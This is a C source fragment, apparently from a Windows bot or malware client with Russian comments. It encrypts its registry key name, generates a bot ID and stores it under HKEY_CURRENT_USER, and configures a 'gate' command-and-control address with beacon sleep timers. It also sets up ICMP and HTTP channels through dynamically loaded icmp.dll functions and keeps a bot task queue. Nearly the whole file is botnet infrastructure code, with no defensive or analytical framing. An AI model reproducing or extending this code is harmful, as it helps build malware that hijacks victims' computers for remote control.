#define KEYNAME /* SOFTWARE\Microsoft\jungle  */ DeCrypt("\x88\xa4\x9d\x87\x8c\x9a\x89\x9e\x8f\xa6\x82\x78\xe9\x84\xe8\x84\x7d\xe7\x8f\x81\xee\x85\x7c\x7f\x7e")
PCHAR SetBotUid()
{
	PCHAR pRet = NULL;
	PCHAR id = 0;
	HKEY hKey = NULL;
	LONG Size = 15;
	LONG Result = 0;

	id = ALLOC(15);
	memset(id,0,15);
	GetRandomStr(10,0x30,0x39,(PCHAR)id);
	RegCreateKeyEx(HKEY_CURRENT_USER,KEYNAME,0,0,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hKey,NULL);
    if(hKey)
    {
        RegSetValueEx(hKey, "id", 0, REG_SZ, (LPBYTE)id, strlen(id));
        RegCloseKey(hKey);
    }

	pRet = (PCHAR)id;
	return pRet;
}

PCHAR GetBotUid()
{
	BOOLEAN bRet = FALSE;
	HKEY hKey = NULL;
	PCHAR pStr;
	LONG Size = 15;
	LONG Result = 0;

	pStr = ALLOC(15);
	memset(pGlobOpt->szBotId,0,10); 
	//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\jungle id

	Result = RegOpenKeyEx( HKEY_CURRENT_USER,KEYNAME,0, KEY_QUERY_VALUE, &hKey ); 
	if(Result == ERROR_SUCCESS)
	{
		// есть ключ
		Result = RegQueryValueEx( hKey, "id", NULL, NULL,(LPBYTE) pStr, &Size);
		if(Result == ERROR_SUCCESS)
		{
			// есть хек
			return pStr;
		}	else	{
			bRet = FALSE;
			goto end;
		}
	}	else	{
		bRet = FALSE;
		goto end;	
	}
end:
	if(hKey)
		RegCloseKey( hKey );
	if(!bRet)
		return NULL;
	return pStr;
}
//==============================================================================
BOOLEAN GetBotGate()
{
	BOOLEAN bRet = TRUE;


	goto end;
end:
	return bRet;
}
//==============================================================================
BOOL InitConfig()
{
	BOOL bRet = TRUE; 
	PCHAR pId = 0;

#ifdef _DEBUG_
	Global.dwGateIp				= api.pinet_addr(CONFIG_IP_SERVER);	// 192.168.1.2"
	Global.dwSleepTime			= (10000*6)*CONFIG_KNOCK_TIME;// 1 minute
#else
	Global.dwGateIp				= api.pinet_addr(CONFIG_IP_SERVER); // for home vmware debug
	Global.dwSleepTime			= (10000*6)*CONFIG_KNOCK_TIME;
#endif

	Global.IcmpSleepTime		= CONFIG_ICMP_SLEEP_TIME;
	Global.HttpSleepTime		= CONFIG_HTTP_SLEEP_TIME;

	// получим бота ID
	pId = GetBotUid();
	if(!pId)
	{
		pId = SetBotUid();
	}
	
	rtl_strcpy((PCHAR)Global.szBotId,pId);
	// получим адрес гейта
	if(!GetBotGate())
		return FALSE;
	Global.Port	= CONFIG_PORT_SERVER;
	memset(pGlobOpt->szGateUrl,0,500);
	strcpy((char *)&pGlobOpt->szGateUrl,CONFIG_PATH_TO_SCRIPT);

	if(api.pWSAStartup(0x02,&WSAData) != 0)
		bRet = FALSE;

	
	g_BotTask.pNextTask = 0;
	g_BotTask.pPrevTask = 0;
	g_BotTask.JobStatus = JOB_STATUS_PAUSE;
	g_BotTask.JobType   = JOB_STATUS_IDLE;
	g_BotTask.JobId	  = 0;
	g_BotTask.Job       = 0;

	__asm { int 3 };
	ICMPCreateFile = (IcmpCreateFilePtr)GetProcAddress(LoadLibrary("icmp.dll"),"IcmpCreateFile");
	if(!ICMPCreateFile)
		ICMPCreateFile = (IcmpCreateFilePtr)GetProcAddress(LoadLibrary("iphlpapi.dll"),"IcmpCreateFile");

	ICMPSendEcho = (IcmpSendEchoPtr)GetProcAddress(LoadLibrary("icmp.dll"),"IcmpSendEcho");
	if(!ICMPSendEcho)
		ICMPSendEcho = (IcmpSendEchoPtr)GetProcAddress(LoadLibrary("iphlpapi.dll"),"IcmpSendEcho");

	ICMPCloseHandle = (IcmpCloseHandlePtr)GetProcAddress(LoadLibrary("icmp.dll"),"IcmpCloseHandle");
	if(!ICMPCloseHandle)
		ICMPCloseHandle = (IcmpCloseHandlePtr)GetProcAddress(LoadLibrary("iphlpapi.dll"),"IcmpCloseHandle");
	return bRet;
}